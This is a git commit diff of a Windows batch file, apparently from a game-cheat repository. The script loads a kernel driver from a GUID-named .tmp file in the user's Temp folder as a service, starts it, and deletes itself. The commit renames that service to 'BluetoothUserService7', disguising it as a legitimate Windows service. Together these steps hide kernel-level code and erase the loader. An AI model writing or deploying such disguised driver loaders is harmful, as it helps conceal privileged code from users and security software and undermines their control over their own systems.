0d4b69557105cc2b6d3301c6c5786320799a9b46
842834fdjfgfg <109022461+TrinityCheat@users.noreply.github.com>
2025-10-09 17:18:42 +0700

    Update 7.bat

--- 7.bat
+++ 7.bat
@@ -1,5 +1,5 @@
 @echo off
 cd %~dp0
-sc create AutoHttpWinProxySvc7463_c binpath=C:\Users\%username%\AppData\Local\Temp\61fc8a92-d37b-4c06-8b45-e798d21a57c3.tmp type=kernel
-sc start AutoHttpWinProxySvc7463_c
+sc create BluetoothUserService7 binpath=C:\Users\%username%\AppData\Local\Temp\61fc8a92-d37b-4c06-8b45-e798d21a57c3.tmp type=kernel
+sc start BluetoothUserService7
 del "%~f0"
